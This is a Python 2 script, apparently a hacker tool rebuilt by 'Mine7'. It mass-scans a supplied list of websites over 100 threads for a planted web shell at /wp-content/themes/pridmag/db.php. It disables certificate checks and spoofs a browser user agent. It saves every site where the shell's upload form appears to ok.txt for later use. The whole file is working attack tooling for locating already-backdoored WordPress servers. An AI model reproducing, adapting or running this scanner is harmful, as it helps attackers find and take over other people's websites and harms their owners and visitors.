# -*-coding:Latin-1 -*
import sys , requests, re
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA


print """
\033[90m                   
 (  (             (                           (      )             
 )\))(   '   (    )\ )      (     (           )\  ( /(    )        
((_)()\ ) (  )(  (()/(`  )  )(   ))\(  (    (((_) )\())( /(  (     
_(())\_)())\(()\  ((_))(/( (()\ /((_)\ )\   )\___((_)\ )(_)) )\ )  
\ \((_)/ ((_)((_) _| ((_)_\ ((_|_))((_|(_) ((/ __| |(_|(_)_ _(_/(  
 \ \/\/ / _ \ '_/ _` | '_ \) '_/ -_|_-<_-<  | (__| ' \/ _` | ' \)) 
  \_/\_/\___/_| \__,_| .__/|_| \___/__/__/   \___|_||_\__,_|_||_|  
                     |_|\033[96mRebuild By Mine7
"""

requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <yourlist.txt>')

def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def FourHundredThree(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/pridmag/db.php?u',headers=headers, allow_redirects=True,timeout=15)
        if 'input name="_upl" type="submit" id="_upl" value="Upload"' in check.content:
                print ' -> ' + url + ' --> {}[Succes]'.format(fg)
                open('ok.txt', 'a').write(url + '/wp-content/themes/pridmag/db.php?u\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/pridmag/db.php?u',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'input name="_upl" type="submit" id="_upl" value="Upload"' in check.content:
                    print ' -> ' + url + ' --> {}[Succes]'.format(fg)
                    open('ok.txt', 'a').write(url + '/wp-content/themes/pridmag/db.php?u\n')
            else:
                print ' -> ' + url + ' --> {}[Failed]'.format(fr)
    except :
        print ' -> ' + url + ' --> {}[Failed]'.format(fr)

mp = Pool(100)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

print '\n [!] {}Result saved in ok.txt'.format(fc)